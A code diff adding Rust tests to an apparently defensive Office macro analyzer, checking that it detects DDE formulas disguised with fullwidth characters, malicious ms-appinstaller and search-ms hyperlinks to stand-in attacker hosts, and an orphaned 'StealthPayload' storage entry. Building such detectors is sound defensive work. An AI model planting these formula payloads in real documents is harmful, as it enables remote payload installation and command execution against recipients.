@@ -1927,3 +1927,126 @@ fn e2e_cfb_cyclic_storage_protection() {
         "error message should report cycle or nesting limit: {err}"
     );
 }
+
+#[test]
+fn e2e_fullwidth_and_living_off_the_land_threat_detection() {
+    let src = "Attribute VB_Name = \"ThreatAudit\"\nSub Dummy()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project(
+        "ThreatAuditProject",
+        &[("ThreatAudit", src, &pcode)],
+        &["Dummy"],
+    );
+
+    let sheet_xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\">\
+        <sheetData>\
+            <row r=\"1\">\
+                <c r=\"A1\"><f>\u{FF1D}pythonw|'run.py'!A0</f></c>\
+                <c r=\"A2\"><f>\u{FF0B}wsl|'sh -c evil'!A0</f></c>\
+                <c r=\"A3\"><f>\u{FF0D}tar|'-xf archive.tar'!A0</f></c>\
+                <c r=\"A4\"><f>=HYPERLINK(\"ms-appinstaller:?source=https://attacker.example.com/mal.msix\", \"Install\")</f></c>\
+                <c r=\"A5\"><f>=HYPERLINK(\"search-ms:query=invoice&amp;crumb=location:\\\\evil.com\\share\", \"View Invoice\")</f></c>\
+            </row>\
+        </sheetData>\
+    </worksheet>";
+
+    let xlsm = synthesize_xlsm_with_sheets(
+        &cfb,
+        &[(
+            "Sheet1",
+            "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
+            sheet_xml,
+        )],
+    );
+
+    let options = AnalysisOptions {
+        limits: Limits::default(),
+        host_profile: HostProfile::Excel,
+        ..Default::default()
+    };
+
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+    let diags = &inspection.extracted.diagnostics;
+
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Potential DDE execution formula") && d.contains("pythonw")),
+        "should detect fullwidth equals and pythonw: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Potential DDE execution formula") && d.contains("wsl")),
+        "should detect fullwidth plus and wsl: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Potential DDE execution formula") && d.contains("tar")),
+        "should detect fullwidth minus and tar: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Suspicious executable download hyperlink")
+                && d.contains("ms-appinstaller:")),
+        "should detect ms-appinstaller protocol handler: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Suspicious executable download hyperlink")
+                && d.contains("search-ms:")),
+        "should detect search-ms protocol handler: {diags:?}"
+    );
+}
+
+#[test]
+fn e2e_lone_cr_line_endings_in_project_and_source() {
+    let src = "Attribute VB_Name = \"CrMod\"\r#Const DEBUG_MODE = 1\r#If DEBUG_MODE\rPublic Sub AutoOpen()\r    MsgBox \"hello\"\rEnd Sub\r#End If\r";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let cfb = synthesize_cfb_project("CrProject", &[("CrMod", src, &pcode)], &["AutoOpen"]);
+    let xlsm = synthesize_xlsm(&cfb);
+
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&xlsm, &options).expect("inspection should succeed");
+
+    assert_eq!(inspection.extracted.modules.len(), 1);
+    let m = &inspection.extracted.modules[0];
+    assert_eq!(m.name, "CrMod");
+    assert!(m.source_text.is_some());
+    assert!(m.source_text.as_ref().unwrap().contains("AutoOpen"));
+}
+
+#[test]
+fn e2e_cfb_unlinked_orphan_directory_entry_detection() {
+    let src = "Sub Clean()\nEnd Sub\n";
+    let line0 = build_func_defn(0);
+    let pcode = synthesize_pcode_line_map(&[&line0]);
+    let mut cfb = synthesize_cfb_project("UnlinkedTest", &[("Mod1", src, &pcode)], &["Clean"]);
+
+    let orphan_entry_off = 1024 + 6 * 128;
+    put_cfb_entry(
+        &mut cfb[orphan_entry_off..],
+        0,
+        "StealthPayload",
+        2, // stream
+        0xFFFFFFFF,
+        0xFFFFFFFF,
+        0xFFFFFFFF,
+        0xFFFFFFFE,
+        0,
+    );
+
+    let comp = vba_insight::cfb::CompoundFile::open(&cfb, &Limits::default())
+        .expect("open should succeed");
+    let unlinked_entry = comp
+        .entries
+        .iter()
+        .find(|e| e.name == "StealthPayload")
+        .expect("StealthPayload entry must be discovered");
+    assert_eq!(unlinked_entry.path, "[unlinked]/StealthPayload");
+}
